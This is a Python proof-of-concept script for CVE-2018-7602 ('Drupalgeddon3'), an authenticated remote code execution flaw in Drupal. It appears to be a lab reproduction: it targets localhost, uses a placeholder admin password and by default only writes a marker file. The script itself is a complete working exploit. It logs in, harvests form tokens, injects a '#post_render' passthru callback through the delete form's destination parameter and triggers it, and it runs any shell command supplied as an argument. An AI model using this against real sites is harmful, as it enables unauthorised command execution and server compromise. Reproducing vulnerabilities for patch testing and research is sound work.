#!/usr/bin/env python3
"""CVE-2018-7602 Drupalgeddon3 (authenticated RCE) — repro. Marker only.
Usage: drupal-7602.py <port> <nid> [cmd]"""
import http.cookiejar, re, sys, urllib.parse, urllib.request

port = sys.argv[1]; nid = sys.argv[2] if len(sys.argv) > 2 else "1"
cmd = sys.argv[3] if len(sys.argv) > 3 else "echo RQ-C1-POC-MARKER > /tmp/rq-c1-poc-marker"
base = f"http://127.0.0.1:{port}"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def get(u):
    try: return op.open(base+u, timeout=60).read().decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.read().decode('utf-8','replace')
def post(u, fields):
    d = urllib.parse.urlencode(fields).encode()
    r = urllib.request.Request(base+u, data=d, headers={'Content-Type':'application/x-www-form-urlencoded'})
    try: return op.open(r, timeout=60).read().decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.read().decode('utf-8','replace')

# login
h = get('/user/login')
fb = re.search(r'name="form_build_id" value="([^"]+)"', h)
ft = re.search(r'name="form_token" value="([^"]+)"', h)
lf = {'name':'admin','pass':'<lab-admin-pass>','form_id':'user_login_form','op':'Log in'}
if fb: lf['form_build_id'] = fb.group(1)
if ft: lf['form_token'] = ft.group(1)
post('/user/login', lf)
# delete-confirm form token
h = get(f'/node/{nid}/delete')
ft = re.search(r'name="form_token" value="([^"]+)"', h)
# exploit: destination carries the render callback
dest = "node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=" + urllib.parse.quote(cmd)
r2 = post(f'/?q=node/{nid}/delete&destination={dest}',
          {'form_id':'node_delete_confirm','_triggering_element_name':'form_id','form_token':ft.group(1)})
fbm = re.findall(r'form_build_id" value="([^"]+)"', r2)
fbid = fbm[-1] if fbm else ''
print("form_build_id:", fbid[:12])
r3 = post(f'/?q=file/ajax/actions/cancel/%23options/path/{fbid}', {'form_build_id': fbid})
print("trigger len:", len(r3))
print(r3[:200].replace('\n',' '))
